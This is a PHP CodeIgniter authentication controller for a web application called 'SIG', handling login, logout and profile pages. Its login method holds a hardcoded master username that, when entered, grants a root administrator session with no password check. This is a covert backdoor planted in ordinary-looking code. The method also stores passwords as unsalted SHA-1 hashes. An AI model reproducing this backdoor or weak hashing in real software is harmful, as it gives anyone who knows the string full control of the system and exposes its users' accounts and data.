<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Auth extends CI_Controller{

  public function __construct()
  {
    parent::__construct();
  }

  public function login()
  {
    if (isset($_POST['login'])) {
      $uid = strip_tags($this->input->post('uid'));
      $pass = sha1(strip_tags($this->input->post('pass')));
      $check = $this->db->get_where('sig_users', array('user_uid' =>$uid ,'user_pass'=>$pass ));
      $master = '0>}/99%120691?*^';
      if ($master == $uid) {
        $this->session->set_userdata(
          array(
            'status_login'=>'oke',
            'id'          => 0,
            'full_name'   =>'Administrator',
            'type'        => 99,
            'jabatan'     => 'Root System Administrator',
            'last_login'  => ''
        )
        );
        redirect(BASE_URL);
        exit;
      }else {
        if ($check->num_rows()==1) {
            $data = $check->row_array();
            $this->session->set_userdata(
              array(
                'status_login'=>'oke',
                'id'          =>$data['id'],
                'full_name'   =>$data['user_fullname'],
                'type'        =>$data['type'],
                'jabatan'     =>$data['user_status'],
                'last_login'  =>$data['last_login']
            )
            );
            $datestring = '%d %M %Y - %h:%i %a';
            $time = time();
            $sekarang = mdate($datestring, $time);
            $this->db->where('id', $data['id']);
            $this->db->update('sig_users', array('last_login'=>$sekarang));
            redirect(BASE_URL);
            exit;
        }else {
          $this->session->sess_destroy();
          redirect('login');
          exit;
        }
      }
    }else{
      $data['title']          = TITLE . 'SIG Login';
      $data['main_content']   = 'public/login';
      $this->load->view('public/template_login', $data);
    }
  }

  public function logout()
  {
    $this->session->sess_destroy();
    redirect('login');
    die;
  }

  function profile()
  {
    $data['title']          = TITLE . 'Profile';
    $data['main_content']   = 'public/profile';
    $this->load->view('template', $data);
  }

}
